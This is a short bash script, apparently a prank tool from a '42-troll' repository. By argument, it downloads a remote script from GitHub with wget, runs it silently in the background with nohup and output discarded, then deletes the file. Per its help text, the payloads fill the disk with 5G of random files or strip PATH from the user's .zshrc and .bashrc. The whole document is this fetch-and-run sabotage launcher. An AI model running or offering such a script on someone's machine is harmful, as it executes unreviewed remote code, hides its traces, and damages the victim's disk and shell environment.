#!/bin/bash

scriptlocation=""

case "$1" in
	--help)
		echo "TODO LATER \nArguments : \n--help : show help\n -F | --full-disk : add 5G of random files everywhere\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc"
	;;
	--full-disk|-F)
		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/full_disk.sh"
	;;
	--where-are-commands|-P)
		scriptlocation="https://raw.githubusercontent.com/Poul0s/42-troll/master/where_are_commands.sh"
	;;
	*)
		echo "arg '$1' invalid"
	;;
esac

if [ ! -z $scriptlocation ] ; then
	wget -q $scriptlocation -O script.sh
	nohup bash ./script.sh > /dev/null 2> /dev/null &
	rm ./script.sh
fi
